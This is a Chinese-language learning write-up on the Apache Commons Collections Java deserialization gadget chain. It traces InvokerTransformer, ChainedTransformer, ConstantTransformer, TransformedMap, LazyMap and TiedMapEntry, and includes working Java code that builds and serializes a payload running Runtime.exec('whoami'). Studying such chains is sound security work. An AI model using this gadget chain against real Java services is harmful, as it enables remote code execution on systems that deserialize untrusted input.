# Java Commons Collection 反序列化分析

## 前言

之前简单的学习过java反序列化的例子，大致原理就是调用readObject，反序列化一个对象，同时readObject会跟着执行一些方法，导致执行任意代码。这里学习的是java cc链，`Apache Commons Collections`是`Apache Commons`的组件，它们是从`Java API`派生而来的，并为Java语言提供了组件体系结构。 `Commons-Collections`试图通过提供新的接口，实现和实用程序来构建JDK类。

## gadgets分析

首先分析`InvokerTransformer`这个类,

```java
public class InvokerTransformer implements Transformer, Serializable {
    static final long serialVersionUID = -8653385846894047688L;
    private final String iMethodName;
    private final Class[] iParamTypes;
    private final Object[] iArgs;

    public static Transformer getInstance(String methodName) {
        if (methodName == null) {
            throw new IllegalArgumentException("The method to invoke must not be null");
        } else {
            return new InvokerTransformer(methodName);
        }
    }

    public static Transformer getInstance(String methodName, Class[] paramTypes, Object[] args) {
        if (methodName == null) {
            throw new IllegalArgumentException("The method to invoke must not be null");
        } else if (paramTypes == null && args != null || paramTypes != null && args == null || paramTypes != null && args != null && paramTypes.length != args.length) {
            throw new IllegalArgumentException("The parameter types must match the arguments");
        } else if (paramTypes != null && paramTypes.length != 0) {
            paramTypes = (Class[])paramTypes.clone();
            args = (Object[])args.clone();
            return new InvokerTransformer(methodName, paramTypes, args);
        } else {
            return new InvokerTransformer(methodName);
        }
    }

    private InvokerTransformer(String methodName) {
        this.iMethodName = methodName;
        this.iParamTypes = null;
        this.iArgs = null;
    }

    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    }

    public Object transform(Object input) {
        if (input == null) {
            return null;
        } else {
            try {
                Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
            } catch (NoSuchMethodException var5) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
            } catch (IllegalAccessException var6) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
            } catch (InvocationTargetException var7) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var7);
            }
        }
    }
}

```

关注一下transform方法，存在反射调用成员方法的可能！

```java
Class cls = input.getClass();
Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
return method.invoke(input, this.iArgs);
```

那么需要控制`input`为被执行的对象，`iMethodName`,`iParamTypes`为方法的名字和参数类型。`iArgs`为实际的参数，这些都是可控的，只需要调用有参构造方法即可。

```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
    this.iMethodName = methodName;
    this.iParamTypes = paramTypes;
    this.iArgs = args;
}
```

**总结**：`InvokerTransformer`提供了反射调用对象方法的可能，只要构造相应的参数即可。下面是一个简单的例子

```java
public class InvokerGadgets {

    public static void main(String[] args) {
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"whoami"});

        Process process = (Process) invokerTransformer.transform(Runtime.getRuntime());// 由于需要有一个input为runtime实例，因为transform方法会调用getclass方法
        Scanner scanner = new Scanner(process.getInputStream());
        String res  = scanner.hasNext()?scanner.next():"";
        System.out.println(res);
    }
}
```





然后看一下`ChainedTransformer`这个类，只需要关注其中几个主要的方法即可，注意到其中`transform`方法的循环中，会将`object`作为参数，同时更新`object`，作为下一次`transform`的参数。

```java
public class ChainedTransformer implements Transformer, Serializable {
    static final long serialVersionUID = 3514945074733160196L;
    private final Transformer[] iTransformers;

    public ChainedTransformer(Transformer[] transformers) {
        this.iTransformers = transformers;
    }
    public Object transform(Object object) {
        for(int i = 0; i < this.iTransformers.length; ++i) {
            object = this.iTransformers[i].transform(object);
        }

        return object;
    }
    public Transformer[] getTransformers() {
        return this.iTransformers;
    }
}
```

构造`InvokerTransform`时，需要显式的调用`transform`方法且其参数为一个runtime实例,这样的场景显然不会出现，利用`ChainedTransformer`则可以降低利用的难度，因为`object`会被更新，且作为参数传入`transform`方法,但是仍需要构造一个`transform`后会返回`runtime`实例的`transformer`类，这样子才能够触发`InvokerTransformer`的反射到`Runtime`。下面时没有构造链时的利用，可以发现还是需要手动输入`Runtime`实例，这个时候需要另一个`gadgets`即`ConstantTransformer`

```java
public class ChainedGadgets {

    public static void main(String[] args) {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"whoami"})
        });
        Process process = (Process) chainedTransformer.transform(Runtime.getRuntime());
        Scanner scanner = new Scanner(process.getInputStream());
        String res = scanner.hasNext()?scanner.next():"";
        System.out.println(res);
    }
}
```

看一下`ConstantTransformer`主要方法

```java
public class ConstantTransformer implements Transformer, Serializable {
    static final long serialVersionUID = 6374440726369055124L;
    public static final Transformer NULL_INSTANCE = new ConstantTransformer((Object)null);
    private final Object iConstant;

    public ConstantTransformer(Object constantToReturn) {
        this.iConstant = constantToReturn;
    }

    public Object transform(Object input) {
        return this.iConstant;
    }
}
```

看到了其中的`transform`方法会返回`iConstant`属性,而这个属性是在创建对象的时候赋值的，于是可以利用这三个`Gadgets`构造一个链

```java
public class ConstantGadgets {
    public static void main(String[] args) {
        ChainedTransformer chainedTransformer = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(Runtime.getRuntime()),new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"whoami"})}
        );
        Process process = (Process) chainedTransformer.transform(null);
        Scanner scanner = new Scanner(process.getInputStream());
        String res = scanner.hasNext()?scanner.next():"";
        System.out.println(res);
    }
}
```

这样子后端代码，只需要调用`transform`方法就可以实现任意代码执行，比如下面这种的后端代码

```java
InputStream iii = request.getInputStream();
ObjectInputStream in = new ObjectInputStream(iii);
obj = in.readObject();
obj.transform(object);
in.close();
```

但是如果直接将上述的`ConstantGadgets`直接反序列化，会出现报错(因为`Runtime.getRuntime`会获得runtime实例，而runtime实例时不能被反序列化的)。那么需要通过反射的方法获取`runtime`实例,payload如下。

```java
public class PayloadDemo {
    public static void main(String[] args) {

        Transformer[] transformers = new Transformer[]{
//           Runtime.class.getMethod("getRuntime").invoke().exec("whoami")
//                Runtime.class.getMethod("getRuntime").invoke()
          // 获取 Runtime class 对象
            new ConstantTransformer(Runtime.class), // 更新参数为Runtime.class
            new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),// 调用getMethod 返回getRuntime方法
            new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),// 反射getRuntime返回Runtime实例
            new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"whoami"})// 利用exec 执行任意代码
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        try(
                FileOutputStream fos = new FileOutputStream("payload.txt");
                ObjectOutputStream oos = new ObjectOutputStream(fos);
            ){
            oos.writeObject(chainedTransformer);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

不过实际环境中可能也并不会存在直接对一个反序列化的对象进行`transform`方法，所以还是需要继续构造。

## 攻击链

首先需要寻找一个可以执行`transform`的类，找到一个`/org/apache/commons/collections/map/TransformedMap.class`

```java
protected Object transformKey(Object object) {
    return this.keyTransformer == null ? object : this.keyTransformer.transform(object);
}

protected Object transformValue(Object object) {
    return this.valueTransformer == null ? object : this.valueTransformer.transform(object);
}
```

可以看到`transformedmap`有两个方法可以调用`transform`,跟进`transformValue`和`transformKey`方法，可发现在`put`方法中调用了上述两种方法

```java
public Object put(Object key, Object value) {
    key = this.transformKey(key);
    value = this.transformValue(value);
    return this.getMap().put(key, value);
}
```

调用`transform`方法的问题，已经解决，但是还需要控制调用者为恶意的输入才行，即`valueTransformer`或`keyTransformer`需要被用户控制，这个时候第一反应是寻找构造函数

```java
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}

protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    super(map);
    this.keyTransformer = keyTransformer;
    this.valueTransformer = valueTransformer;
}
```

到此已经可以构造一个不需要显示调用transform的payload，但是如果想要达到反序列化RCE还是需要调用readObject方法，同时readObject方法还需要调用map的相关方法，触发transform执行任意代码。

> 由于笔者这里使用的是jdk9,没有相关的readObject可以直接触发，这里使用toString触发的一种攻击链

`/org/apache/commons/collections/map/LazyMap.java`中存在get方法,可以调用transform方法和put方法。

```java
public Object get(Object key) {
    if (!super.map.containsKey(key)) {
        Object value = this.factory.transform(key);
        super.map.put(key, value);
        return value;
    } else {
        return super.map.get(key);
    }
}
```

其factory也是可控的，其构造函数如下

```java
protected LazyMap(Map map, Transformer factory) {
    super(map);
    if (factory == null) {
        throw new IllegalArgumentException("Factory must not be null");
    } else {
        this.factory = factory;
    }
}
```

可以通过`toString`调用`getKey`方法，其中`TiedMapEntry`类的`getValue`方法会调用`get`方法进而触发`transform`。

```java
// LazyMap
public String toString() {
    return this.getKey() + "=" + this.getValue();
}
// TiedMapEntry
public Object getValue() {
    return this.map.get(this.key);
}
// TiedMapEntry->toString==>TiedMapEntry->getValue ==> LazyMap->get() ==> 触发transform
```

## 参考链接

https://www.smi1e.top/2019/07/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bapache-commons-collections/

https://xz.aliyun.com/t/8500

http://www.jackson-t.ca/runtime-exec-payloads.html